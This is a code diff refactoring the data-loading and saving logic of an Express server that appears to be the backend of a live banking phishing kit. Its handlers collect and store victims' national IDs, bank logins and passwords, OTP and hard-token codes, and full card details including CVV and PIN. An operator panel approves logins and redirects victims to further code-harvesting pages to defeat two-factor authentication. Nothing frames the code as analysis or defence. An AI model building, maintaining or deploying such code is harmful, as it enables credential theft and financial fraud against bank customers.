@@ -40,12 +40,7 @@ async function sbFetch(path, opts = {}) {
   return res.json();
 }
 
-let lastLoadTime = 0;
-const LOAD_CACHE_MS = 3000;
-
-async function loadData(force) {
-  const now = Date.now();
-  if (!force && lastLoadTime && (now - lastLoadTime) < LOAD_CACHE_MS) return;
+async function loadAll() {
   try {
     const rows = await sbFetch('app_data?select=key,value');
     if (Array.isArray(rows)) {
@@ -58,42 +53,56 @@ async function loadData(force) {
         }
       }
     }
-    lastLoadTime = Date.now();
   } catch (e) {
-    console.error('loadData failed:', e.message);
+    console.error('loadAll failed:', e.message);
   }
 }
 
-async function saveData() {
+async function loadKey(key) {
   try {
-    const items = [
-      { key: 'applications', value: applications },
-      { key: 'visitors', value: liveVisitors },
-      { key: 'total_visitors', value: totalVisitors }
-    ];
-    for (const item of items) {
-      await sbFetch('app_data', {
-        method: 'POST',
-        headers: { 'Prefer': 'resolution=merge-duplicates' },
-        body: JSON.stringify({ key: item.key, value: item.value, updated_at: new Date().toISOString() })
-      });
-    }
-    lastLoadTime = Date.now();
+    const rows = await sbFetch(`app_data?key=eq.${key}&select=value`);
+    if (Array.isArray(rows) && rows.length > 0) return rows[0].value;
   } catch (e) {
-    console.error('saveData failed:', e.message);
+    console.error('loadKey failed:', key, e.message);
   }
+  return null;
 }
 
-async function saveAdmin() {
+async function saveKey(key, value) {
   try {
     await sbFetch('app_data', {
       method: 'POST',
       headers: { 'Prefer': 'resolution=merge-duplicates' },
-      body: JSON.stringify({ key: 'admin_config', value: adminConfig, updated_at: new Date().toISOString() })
+      body: JSON.stringify({ key, value, updated_at: new Date().toISOString() })
     });
   } catch (e) {
-    console.error('saveAdmin failed:', e.message);
+    console.error('saveKey failed:', key, e.message);
   }
+}
+
+async function freshLoadApps() {
+  const v = await loadKey('applications');
+  if (v !== null) applications = v;
+}
+
+async function freshLoadVisitors() {
+  const v = await loadKey('visitors');
+  if (v !== null) liveVisitors = v;
+  const t = await loadKey('total_visitors');
+  if (t !== null) totalVisitors = (typeof t === 'number') ? t : 0;
+}
+
+async function saveApps() {
+  await saveKey('applications', applications);
+}
+
+async function saveVisitors() {
+  await saveKey('visitors', liveVisitors);
+  await saveKey('total_visitors', totalVisitors);
+}
+
+async function saveAdmin() {
+  await saveKey('admin_config', adminConfig);
 }
 
 async function saveSession(token) {
@@ -174,7 +183,7 @@ let dbReady = false;
 app.use(async (req, res, next) => {
   if (!dbReady) {
     try {
-      await loadData(true);
+      await loadAll();
       dbReady = true;
     } catch (e) {
       console.error('Init load failed:', e.message);
@@ -221,25 +230,25 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'getApplications': {
-      await loadData();
+      await freshLoadApps();
       const activeIds = getActiveIds();
       return { apps: applications, activeIds, totalVisitors };
     }
 
     case 'getLiveVisitors': {
-      await loadData();
+      await freshLoadVisitors();
       const cutoff = Date.now() - 15000;
       const live = liveVisitors.filter(v => v.lastActiveAt && v.lastActiveAt > cutoff);
       return { visitors: live };
     }
 
     case 'getAllVisitors': {
-      await loadData();
+      await freshLoadVisitors();
       return { visitors: liveVisitors, totalCount: totalVisitors };
     }
 
     case 'savePersonalInfo': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, phoneNumber, fullName, governorate, address } = input;
       if (!nationalId) return { success: false };
       let app = findApp(nationalId);
@@ -248,121 +257,125 @@ async function handleProcedure(fullPath, rawInput, req, res) {
         applications.push(app);
       }
       Object.assign(app, { phoneNumber, fullName, governorate, address, currentPage: 'personal', lastActiveAt: Date.now() });
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'saveLoginData': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, username, password } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { username, password, currentPage: 'login', lastActiveAt: Date.now() });
-        await saveData();
+        await saveApps();
       }
       return { success: true };
     }
 
     case 'saveOtpData': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, otpCode } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { otpCode, currentPage: 'otp', lastActiveAt: Date.now() });
-        await saveData();
+        await saveApps();
       }
       return { success: true };
     }
 
     case 'saveCardData': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { cardNumber, cardExpiry, cardCvv, cardPin, currentPage: 'card', lastActiveAt: Date.now() });
-        await saveData();
+        await saveApps();
       }
       return { success: true };
     }
 
     case 'saveWatchLink': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, watchLinkOtp } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { watchLinkOtp, currentPage: 'watchlink', lastActiveAt: Date.now() });
-        await saveData();
+        await saveApps();
       }
       return { success: true };
     }
 
     case 'saveHardToken': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, hardTokenCode } = input;
       const app = findApp(nationalId);
       if (app) {
         Object.assign(app, { hardTokenCode, currentPage: 'hard-token', lastActiveAt: Date.now() });
-        await saveData();
+        await saveApps();
       }
       return { success: true };
     }
 
     case 'updatePage': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, page } = input;
       const app = findApp(nationalId);
       if (app) {
         app.currentPage = page;
         app.lastActiveAt = Date.now();
-        await saveData();
+        await saveApps();
       }
       return { success: true };
     }
 
     case 'redirectUser':
     case 'redirectVisitor': {
-      await loadData();
       const { nationalId, sessionId, page, showError } = input;
       if (nationalId) {
+        await freshLoadApps();
         const app = findApp(nationalId);
         if (app) { app.redirectTo = page; app.redirectError = showError || false; }
+        await saveApps();
       }
       if (sessionId) {
+        await freshLoadVisitors();
         const v = liveVisitors.find(x => x.sessionId === sessionId);
         if (v) { v.redirectTo = page; }
+        await saveVisitors();
       }
-      await saveData();
       return { success: true };
     }
 
     case 'clearVisitorRedirect': {
-      await loadData();
       const { nationalId, sessionId } = input;
       if (nationalId) {
+        await freshLoadApps();
         const app = findApp(nationalId);
         if (app) { delete app.redirectTo; delete app.redirectError; }
+        await saveApps();
       }
       if (sessionId) {
+        await freshLoadVisitors();
         const v = liveVisitors.find(x => x.sessionId === sessionId);
         if (v) { delete v.redirectTo; }
+        await saveVisitors();
       }
-      await saveData();
       return { success: true };
     }
 
     case 'clearRedirectByUser': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId } = input;
       if (nationalId) {
         const app = findApp(nationalId);
         if (app) { delete app.redirectTo; delete app.redirectError; }
       }
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'getRedirectStatus': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId } = input;
       if (nationalId) {
         const app = findApp(nationalId);
@@ -372,7 +385,7 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'getVisitorRedirect': {
-      await loadData();
+      await freshLoadVisitors();
       const { sessionId } = input;
       if (sessionId) {
         const v = liveVisitors.find(x => x.sessionId === sessionId);
@@ -382,65 +395,64 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'redirectAllToToken': {
-      await loadData();
+      await freshLoadApps();
       applications.forEach(a => { a.redirectTo = 'token'; });
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'redirectWhatsApp': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId } = input;
       const app = findApp(nationalId);
       if (app) { app.redirectTo = 'whatsapp'; }
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'approveLogin': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId } = input;
       const app = findApp(nationalId);
       if (app) { app.loginStatus = 'approved'; }
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'rejectLogin': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId } = input;
       const app = findApp(nationalId);
       if (app) { app.loginStatus = 'rejected'; }
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'deleteApplication': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId } = input;
       applications = applications.filter(a => a.nationalId !== nationalId);
-      await saveData();
+      await saveApps();
       return { success: true };
     }
 
     case 'deleteInactiveClients': {
-      await loadData();
+      await freshLoadApps();
       const activeIds = getActiveIds();
       const before = applications.length;
       applications = applications.filter(a => activeIds.includes(a.nationalId));
-      await saveData();
+      await saveApps();
       return { success: true, deletedCount: before - applications.length };
     }
 
     case 'resetTotalVisitors': {
       totalVisitors = 0;
       liveVisitors = [];
-      await saveData();
+      await saveVisitors();
       return { success: true };
     }
 
     case 'getWhatsAppLink': {
-      await loadData();
       return { link: adminConfig.whatsAppLink || '' };
     }
 
@@ -451,16 +463,15 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'getCustomMessage': {
-      await loadData();
       return { message: adminConfig.customMessage || '' };
     }
 
     case 'setCustomMessage': {
-      await loadData();
       const { nationalId, message } = input;
       if (nationalId) {
+        await freshLoadApps();
         const app = findApp(nationalId);
-        if (app) { app.customMessage = message; await saveData(); }
+        if (app) { app.customMessage = message; await saveApps(); }
       } else {
         adminConfig.customMessage = message || '';
         await saveAdmin();
@@ -475,10 +486,10 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'updateVisitor': {
-      await loadData();
+      await freshLoadApps();
       const { nationalId, ...data } = input;
       const app = findApp(nationalId);
-      if (app) { Object.assign(app, data); await saveData(); }
+      if (app) { Object.assign(app, data); await saveApps(); }
       return { success: true };
     }
 
@@ -526,7 +537,7 @@ app.post('/api/presence', async (req, res) => {
   const { sessionId, currentPage } = req.body || {};
   if (!sessionId) return res.json({ ok: false });
 
-  await loadData();
+  await freshLoadVisitors();
 
   let visitor = liveVisitors.find(v => v.sessionId === sessionId);
   if (!visitor) {
@@ -540,10 +551,10 @@ app.post('/api/presence', async (req, res) => {
   const redirectTo = visitor.redirectTo;
   if (redirectTo) {
     delete visitor.redirectTo;
-    await saveData();
+    await saveVisitors();
     return res.json({ ok: true, redirectTo });
   }
-  await saveData();
+  await saveVisitors();
   res.json({ ok: true });
 });
 
@@ -551,11 +562,11 @@ app.post('/api/heartbeat', async (req, res) => {
   const { sessionId, visitorId } = req.body || {};
   const id = sessionId || visitorId;
   if (id) {
-    await loadData();
+    await freshLoadVisitors();
     const visitor = liveVisitors.find(v => v.sessionId === id);
     if (visitor) {
       visitor.lastActiveAt = Date.now();
-      await saveData();
+      await saveVisitors();
     }
   }
   res.json({ ok: true });
@@ -590,7 +601,7 @@ app.get('*', (req, res) => {
 });
 
 if (!IS_VERCEL) {
-  loadData(true).then(() => {
+  loadAll().then(() => {
     app.listen(PORT, () => {
       console.log(`Server running on http://localhost:${PORT}`);
     });
